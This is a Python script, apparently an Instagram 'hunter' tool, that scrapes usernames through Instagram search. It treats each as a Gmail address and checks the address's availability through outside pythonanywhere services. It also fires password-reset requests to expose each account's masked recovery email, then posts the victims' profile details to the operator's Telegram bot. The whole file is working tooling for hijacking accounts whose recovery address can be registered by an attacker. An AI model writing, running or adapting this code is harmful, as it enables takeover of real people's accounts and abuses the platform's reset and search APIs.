import requests
import random
import time
from OneClick import Hunter
import secrets
import uuid
from uuid import uuid4
Token = input('ENTER YOUR TOKEN BOT : ')

ID = input('ENTER YOUR ID TELEGRAM : ')

sessionid = input('ENTER YOUR SESSIONID : ')

def Hacked(username):
    email=username
    UserAgent = str(Hunter.Services())
    secr = secrets.token_hex(32)
    Session = requests.Session()
    Session.headers = ({
        'User-Agent': UserAgent,
        'X-Requested-With': 'XMLHttpRequest',
        'X-Csrftoken':secr,
    });tim = int(time.time())
    data = ({
    'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{tim}:efaedfae',
    'username':f'{email}'
    });response = requests.post('https://www.instagram.com/api/v1/web/accounts/login/ajax/',
        headers=Session.headers,
        data=data
    );res = response.text

    if ('"user":true') in res:
        print('Avaliable InstaGram : {}'.format(email))
        link = requests.get('http://hitler3.pythonanywhere.com/HITLER/GmailCheck?email={}'.format(email)).json()["code"]
        if link==('Unavailable E-mail'):
            print('Unavailable E-mail : {}'.format(email))
        elif link==('Not Found E-mail'):
            print('Not Found E-mail : {}'.format(email))
        elif link==('Available E-mail'):
            print('Available E-mail : {}'.format(email))
            username = email.split('@gmail.com')[0]
            headers = {
                'authority': 'www.instagram.com',
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.9,ar-AE;q=0.8,ar;q=0.7',
                'dpr': '2.26074',
                'referer': 'https://www.instagram.com/wqaec/',
                'sec-ch-prefers-color-scheme': 'dark',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.72"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-model': '"SM-A107F"',
                'sec-ch-ua-platform': '"Android"',
                'sec-ch-ua-platform-version': '"11.0.0"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
                'viewport-width': '319',
                'x-asbd-id': '129477',
                'x-csrftoken': '1Q6NEtA1VDK17zRdz9nrSBy6gdNSva1u',
                'x-ig-app-id': '1217981644879628',
                'x-ig-www-claim': 'hmac.AR3Dt_9ilcmBnxwvxL1fFAv-fFfTdPCXcsxSLtrbT_dt4aCV',
                'x-requested-with': 'XMLHttpRequest',
            }

            params = {
                'username': username,
            }

            r = requests.get(
                'https://www.instagram.com/api/v1/users/web_profile_info/',
                params=params,
                headers=headers,
            ).json()
            try:
                user = r["data"]["user"]["username"]
                name = r["data"]["user"]["full_name"]
                followers = r["data"]["user"]["edge_followed_by"]["count"]
                following = r["data"]["user"]["edge_follow"]["count"]
                bio = r["data"]["user"]["biography"]
                busn = r["data"]["user"]["is_business_account"]
                private = r["data"]["user"]["is_private"]
                id = r["data"]["user"]["id"]
                zp=requests.get(f'https://o7aa.pythonanywhere.com/?id={id}').json()
                date=zp['date']
                head= {
                                    "accept": "*/*",
                                    "accept-language": "ar-AE,ar-IQ;q=0.9,ar;q=0.8,en-US;q=0.7,en;q=0.6",
                                    "sec-ch-prefers-color-scheme": "light",
                                    "sec-ch-ua": "\"Not:A-Brand\";v=\"99\", \"Chromium\";v=\"112\"",
                                    "sec-ch-ua-full-version-list": "\"Not:A-Brand\";v=\"99.0.0.0\", \"Chromium\";v=\"112.0.5615.137\"",
                                    "sec-ch-ua-mobile": "?1",
                                    "sec-ch-ua-platform": "\"Android\"",
                                    "sec-fetch-dest": "empty",
                                    "sec-fetch-mode": "cors",
                                    "sec-fetch-site": "same-origin",
                                    "viewport-width": "412",
                                    "x-asbd-id": "198387",
                                    "x-csrftoken": "nVW5MosXQoEr1Rv1Nc4qraggjTdU5pss",
                                    "x-ig-app-id": "1217981644879628",
                                    "x-ig-www-claim": "hmac.AR2QM86Qe5fITwAGguadrM-4LVWQ1OQc5RTpaUp_PHZQAkfb",
                                    "x-requested-with": "XMLHttpRequest"
                                    }
                data = {
                                    'ig_sig_key_version': '4',
                                    "user_id":f'{id}'
                                    }
                hr = requests.post('https://i.instagram.com/api/v1/accounts/send_password_reset/',headers=head, data=data).json()
                o=hr['obfuscated_email']
                ko=o.split('@')[0]
                first = email[0]
                last=email[email.index('@') -1]
                
                info = f"""
            𝚂𝚞𝚌𝚌𝚎𝚜𝚜 𝚒𝚗 𝙰𝚌𝚌𝚘𝚞𝚗𝚝
            ================
            𝙴𝚛𝚛𝚘𝚛 𝙸𝚗𝚏𝚘 𝙰𝚌𝚌𝚘𝚞𝚗𝚝
                
            𝙴𝚖𝚊𝚒𝚕 𝙰𝚌𝚌𝚘𝚞𝚗𝚝 : {email}
            𝚄𝚜𝚎𝚛𝙽𝚊𝚖𝚎 : {username}
            𝙽𝚊𝚖𝚎 : {name}
            𝙵𝚘𝚕𝚕𝚘𝚠𝚎𝚛𝚜 : {followers}
            𝙵𝚘𝚕𝚕𝚘𝚠𝚒𝚗𝚐 : {following}
            𝙱𝚒𝚘 𝙰𝚌𝚌𝚘𝚞𝚗𝚝 : {bio}
            𝙱𝚞𝚜𝚒𝚗𝚎𝚜𝚜 𝙰𝚌𝚌𝚘𝚞𝚗𝚝 : {busn}
            𝙿𝚛𝚒𝚟𝚊𝚝𝚎 𝙰𝚌𝚌𝚘𝚞𝚗𝚝 : {private}
            𝙸𝚍 𝙰𝚌𝚌𝚘𝚞𝚗𝚝 : {id}
            𝙳𝚊𝚝𝚎 𝙰𝚌𝚌𝚘𝚞𝚗𝚝 : {date}
            𝚁𝚎𝚜𝚎𝚝 𝙰𝚌𝚌𝚘𝚞𝚗𝚝 : {o}
            ================
            𝚃𝚑𝚎 𝙿𝚛𝚘𝚐𝚛𝚊𝚖𝚖𝚎𝚛 : @termixiraq
                """
                
                inf = f"""
            𝚂𝚞𝚌𝚌𝚎𝚜𝚜 𝚒𝚗 𝙰𝚌𝚌𝚘𝚞𝚗𝚝
            ================
            𝙶𝚘𝚘𝚍 𝙸𝚗𝚏𝚘 𝙰𝚌𝚌𝚘𝚞𝚗𝚝
                
            𝙴𝚖𝚊𝚒𝚕 𝙰𝚌𝚌𝚘𝚞𝚗𝚝 : {email}
            𝚄𝚜𝚎𝚛𝙽𝚊𝚖𝚎 : {username}
            𝙽𝚊𝚖𝚎 : {name}
            𝙵𝚘𝚕𝚕𝚘𝚠𝚎𝚛𝚜 : {followers}
            𝙵𝚘𝚕𝚕𝚘𝚠𝚒𝚗𝚐 : {following}
            𝙱𝚒𝚘 𝙰𝚌𝚌𝚘𝚞𝚗𝚝 : {bio}
            𝙱𝚞𝚜𝚒𝚗𝚎𝚜𝚜 𝙰𝚌𝚌𝚘𝚞𝚗𝚝 : {busn}
            𝙿𝚛𝚒𝚟𝚊𝚝𝚎 𝙰𝚌𝚌𝚘𝚞𝚗𝚝 : {private}
            𝙸𝚍 𝙰𝚌𝚌𝚘𝚞𝚗𝚝 : {id}
            𝙳𝚊𝚝𝚎 𝙰𝚌𝚌𝚘𝚞𝚗𝚝 : {date}
            𝚁𝚎𝚜𝚎𝚝 𝙰𝚌𝚌𝚘𝚞𝚗𝚝 : {o}
            ================
            𝚃𝚑𝚎 𝙿𝚛𝚘𝚐𝚛𝚊𝚖𝚖𝚎𝚛 : @termixiraq
                """
                if first and last in ko:
                    print(inf)

                    requests.post(f"https://api.telegram.org/bot{Token}/sendMessage?chat_id={ID}&text="+str(inf))
                else:
                    print(info)
                    requests.post(f"https://api.telegram.org/bot{Token}/sendMessage?chat_id={ID}&text="+str(info))
            except IndexError:
                pass
    else:
        print('Unavaliable InstaGram : {}'.format(email))



def GetUsers():
    HUNTER = str(Hunter.Services())
    CSRF = secrets.token_hex(32)
    text='jrogersevilpiratestudio1234567890'
    numb='56789'
    user12=int("".join(random.choice(numb)for i in range(1)))
    usernamee=str("".join(random.choice(text)for i in range(user12)))
    url=f'https://www.instagram.com/api/v1/web/search/topsearch/?context=blended&include_reel=true&query={usernamee}&rank_token=0.23828410114107612&search_surface=web_top_search'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                
    head={
    'Host': 'www.instagram.com',
    'pragma': 'no-cache',
    'cache-control': 'no-cache',
    'x-ig-www-claim': 'hmac.AR25qK4_n0HoQof0OBeLskAl3Qf_s-9QbyJekeGkQTaoKsXk',
    'user-agent': HUNTER, 
    'viewport-width': '412',
    'accept': '*/*', 
    'x-requested-with': 'XMLHttpRequest', 
    'x-asbd-id': '129477', 
    'dpr': '1.75', 
    'x-csrftoken': f'{CSRF}', 
    'sec-ch-prefers-color-scheme': 'light', 
    'x-ig-app-id': ''+''.join(random.choice('1217981644879628')for _ in range(16)), 
    'sec-fetch-site': 'same-origin',
    'sec-fetch-mode': 'cors', 
    'sec-fetch-dest': 'empty', 
    'referer': 'https://www.instagram.com/explore/search/', 
    'accept-encoding': 'gzip, deflate', 
    'accept-language': 'ar-AE,ar;q=0.9,en-US;q=0.8,en;q=0.7', 
    'Cookie':f'mid=ZIwIGQALAAFJh0hs0zugnqEWswdV; ig_did=86209C21-70C2-4E14-B4F6-91D07CD08186; ig_nrcb=1; datr=EQiMZDSU8kuwtKAAlo7Zzc7X; csrftoken={CSRF}; ds_user_id=61045883540; sessionid={sessionid}; rur="CLN\05461045883540\0541722174152:01f721265c6f920ad103c26842959d1079e7d3a83bf1b64c656744e6766e356c48af5475"',
            }
    respoins=requests.get(url, headers=head).json()
    c=0
    try:
        while True:
            c+=1
            username=respoins['users'][c]['user']['username']+'@gmail.com'
            Hacked(username)
    except:
        GetUsers()

GetUsers()
